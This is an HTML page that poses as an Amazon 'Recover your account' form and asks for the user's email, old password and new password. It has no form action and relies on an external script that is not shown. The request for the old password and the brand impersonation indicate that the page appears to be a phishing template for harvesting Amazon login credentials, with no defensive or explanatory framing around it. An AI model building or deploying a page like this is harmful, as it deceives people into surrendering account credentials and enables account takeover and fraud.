<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/static/favicon.jpg" sizes="16x16" type="image/png">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <link rel="stylesheet" href="/static/index.css">
    <script defer src="/static/index.js"></script>
    <title>Amazon Account Assistance</title>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="/static/logo.png" alt="logo" >
        </div>
        <div class="card">
            <div class="card-body">
                <h3 class="card-title"> Recover your account</h2>
                <form>
                    <div class="form-group">
                        <label for="email">Email</label>
                        <input type="email" required id="email" class="form-control">
                    </div>
                    <div class="form-group">
                        <label for="old_password">Old Password</label>
                        <input type="password" id="old_password" required class="form-control">
                    </div>
                    <div class="form-group">
                        <label for="new_password">New Password</label>
                        <input type="password" id="new_password" required class="form-control">
                    </div>
                    <input type="submit"  class="btn btn-amazon btn-block"value="Recover your account">
                </form>
            </div>
        </div>
    </div>
</body>
</html>
